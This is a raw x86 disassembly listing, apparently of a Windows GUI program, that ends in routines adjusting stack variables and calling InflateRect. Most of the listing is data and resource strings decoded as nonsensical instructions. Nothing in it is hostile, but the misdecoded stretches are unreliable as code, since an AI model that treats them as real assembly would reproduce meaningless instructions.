add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42f52472
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add bh bh
push eax
or al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
pushad
or al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
call [ eax + 0xa ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x43
push 0x6948776f
outsb
je r-xdata
outsd
ja r-xdata
int1
inc edx
add [ ecx + 0x1 ] ch
add bh bh
hlt
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
inc edx
add [ eax - 0xc ] cl
inc edx
add [ eax + eax ] al
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] bl
or [ ebx ] eax
xor [ ecx + eax * 2 + 0x420be400 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0xb880042 ] bh
inc edx
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
enter 0x4308 0x0
add [ eax ] eax
out dx eax
dec [ eax + 0x600430a ]
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xf4549072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42f41072
add [ eax ] dl
insd
inc ecx
add [ 0x78450800 ] al
je r-xdata
imul ebp [ esi + 0x74 ] sub_42f100
push 0xd8ff0001
sub_42f5ae
inc esp
add [ edi + ecx + 0x43 ] bl
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax + 0xb ] ah
inc ebx
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 + 0x111c0044 ] al
inc ebx
add ah ah
int3
sub_42f72a
inc esp
add [ edi + ecx + 0x43 ] bl
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax + 0xb ] ah
inc ebx
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 + 0x111c0044 ] al
inc ebx
add ah ah
int3
sub_42f84b
in al dx
push cs
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
insb
dec edi
jne r-xdata
add [ eax ] al
call [ esi ]
add [ 0x6f6c6f43 ] al
jb r-xdata
jb r-xdata
sbb al 0x2
add bh bh
inc eax
cmovae eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ebp - 0x6b00ffff ] ah
rol [ eax + eax - 0x48 ] 0x1
rol [ eax + eax ] 0x1
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add [ eax ] ah
imul eax [ eax + eax ] 0xf800000
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc ebx
jb r-xdata
je r-xdata
sub al [ eax + eax + 0x14 ]
add al [ eax ]
dec [ eax ]
cmovae eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi - 0x1700ffff ] ah
rol [ eax + eax + 0x1 ] cl
inc esp
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
outsd
jb r-xdata
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ eax + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
sub [ eax + eax + 0x18 ] eax
add al [ eax ]
jmp [ edi + ecx ]
[ 0x1ff0002 ]
jae r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
add [ eax ] al
insb
sub [ gs : ebx ] bl
inc esp
add [ edi + 0x44 ] ah
add [ edi - 0x78abffbc ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edx + 0x44 ] dl
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
inc eax
adc al 0x44
adc [ eax ] al
test al 0x1
add bh bh
xor [ esp + eax * 2 + 0x100 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
imul ebp [ edi + 0x6e ] sub_421ed8
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x58ff0000
push 0x68680044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
add al 0x69
inc esp
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
push esp
loop r-xdata
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
inc esp
add [ ecx ] al
je r-xdata
outsb
xor [ eax ] 0x0
push cs
dec edi
jpe r-xdata
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
jo r-xdata
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
sub [ ecx + 0x44 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
push esp
pop eax
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
add [ es : edx ] cl
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0xc4ff0001
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
rcr [ esi ] 0x1
inc esp
add al ch
push eax
outsd
jo r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x10656c62
and al [ eax + eax - 0x40 ]
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
inc edi
je r-xdata
push esp
pop eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xe46f666e
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec edi
jb r-xdata
js r-xdata
push ds
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
jpe r-xdata
pop ds
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
and [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jb r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
xor [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
or al 0x24
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0030 ] al
jo r-xdata
jb r-xdata
jb r-xdata
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941fd76
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
xor eax [ eax ]
or cl [ edi + 0x6e ]
and [ eax + eax - 0x48 ] al
add [ eax ] eax
add [ eax ] eax
add [ eax ] al
jae r-xdata
inc esp
outsd
arpl [ ebx + 0x30 ] bp
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
and [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
push es
jpe r-xdata
jb r-xdata
jb r-xdata
je r-xdata
adc [ ebx ] eax
dec esp
mov [ eax + eax + 0x44 ] al
dec esi
outsd
outsb
push es
jb r-xdata
jb r-xdata
inc edx
add [ esi ] al
inc ebp
jbe r-xdata
add [ edi ] eax
dec esi
ja r-xdata
push esp
dec ecx
outsb
je r-xdata
inc esp
jb r-xdata
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add al bl
jns r-xdata
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax + 0x4c00445b ] ah
jl r-xdata
inc esp
dec esp
outsb
je r-xdata
jae r-xdata
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
js r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
int3
jo r-xdata
add [ edx + ecx * 4 + 0x6c380044 ] dl
inc esp
add [ eax + 0x2000446c ] ah
pop ebp
inc esp
add [ esp + ebp * 2 + 0x14580044 ] cl
inc ebx
add ah ah
adc eax 0x15b40043
inc ebx
add [ 0xffffffffd4ffd500 ] al
call ebx
call eax
inc edi
call [ eax ]
push ss
inc ebx
add [ edx + ebx ] ah
inc ebx
add ah cl
sbb al [ ebx ]
sbb al 0x14
inc ebx
add [ eax + 0x1b ] ch
inc ebx
add [ ecx ] cl
push esp
push ebx
add [ eax ] bh
insb
add [ eax - 0x57ffbb89 ] ch
pop edx
inc esp
add ah ch
popad
inc esp
add [ eax + 0x61 ] dl
inc esp
add [ eax + 0x6a ] bh
inc esp
add [ eax + ecx * 4 + 0x44 ] cl
popad
je r-xdata
add ecx [ eax ]
push es
push ebx
outsb
inc esp
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ ebx + edi * 2 + 0x44 ] ch
imul ebp [ esi + 0x65 ] 0x55737208
jo r-xdata
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push es
fmul [ edx + eax * 2 ]
inc ebx
popad
jo r-xdata
imul esi [ esp + esi * 2 + 0x65 ] 0x40c08b72
add [ ebx ] eax
pop es
or [ ebx + edx * 2 + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x43007872
add [ eax + esi ] bl
inc esp
add [ edi ] dl
add [ eax ] cl
inc ebp
js r-xdata
add [ esp + edi * 2 + 0x44 ] al
or [ edx + 0x73 ] esi
push eax
popad
je r-xdata
inc eax
add [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
inc ebx
add [ eax ] dh
add [ ebx ] eax
enter 0x1 0x0
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al 0xff
inc edx
add [ ebx ] al
or al 0x54
push edx
jae r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
pop eax
adc [ ebx ] eax
fdiv [ esi + 0x44 ]
add al bl
jbe r-xdata
or al 0x42
insb
jae r-xdata
adc [ eax ] al
insd
add [ eax ] eax
[ eax + 0x1b ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x65420700
jbe r-xdata
add al 0x69
inc esp
add [ eax ] ah
imul eax [ eax + eax ] 0x5800000
add [ eax ] al
dec [ esi ]
add [ 0x6f6c6f43 ] al
inc ebx
je r-xdata
inc esp
jb r-xdata
sub [ edi ] ch
jpe r-xdata
pop es
inc eax
add [ eax ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ ebx ] eax
xor [ ecx ] al
inc ebx
add al cl
add [ eax ] eax
add [ eax ] ch
das
popad
insb
fcomp [ fs : esi ]
jb r-xdata
adc al 0x44
add [ eax ] bh
add bh bh
jo r-xdata
jb r-xdata
imul eax [ eax + eax + 0x20 ] 0x4469
add [ eax ] al
add [ 0xeff0000 ] 0x0
add eax 0x6f6c6f43
insb
jae r-xdata
add ah dh
cmovb eax [ eax ]
inc esp
add [ ebp + 0x44 ] cl
or [ ebp + 0x78 ] al
je r-xdata
add [ eax ] al
push ebx
je r-xdata
add [ eax ] al
add [ edx ] dl
add [ ebx ] cl
push edx
jae r-xdata
imul ebp [ esi + 0x74 ] 0x42ff6c73
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
dec ebp
imul ebp [ esi + 0x53 ] 0x657a69
adc [ eax ] al
pop edx
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or edx [ eax + 0x61 ]
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dl 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ ecx + eax ] ch
[ ecx + eax ]
add [ eax + 0x14 ] bl
inc esp
add [ ebx ] bl
add bh bh
js r-xdata
insb
je r-xdata
jpo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al ah
inc [ edx ]
push edx
jae r-xdata
jpe r-xdata
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
outsb
je r-xdata
inc edx
add [ eax ] dh
add bh bh
push ds
inc esp
add [ ecx ] al
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add al dl
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423e04
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424880
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423e04
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424880
pop ebx
mov esp ebp
pop ebp
retn
jpe r-xdata
popad
outsb
push ebx
je r-xdata
add [ edi ] al
outsd
insb
outsd
jb r-xdata
inc ebx
or al 0x89
inc ebp
hlt
push esp
pop eax
inc ecx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
jmp [ eax ]
insb
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
[ eax ]
inc [ edx ]
test al 0x1
add bh bh
test al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
adc al [ eax ]
or edx [ edx + 0x65 ]
jae r-xdata
hlt
push esp
pop eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b55c08b
in al dx
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
sub_430348
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423e04
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424880
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423e04
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424880
pop ebx
mov esp ebp
pop ebp
retn
sub_43040c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_423f10
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_430348
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
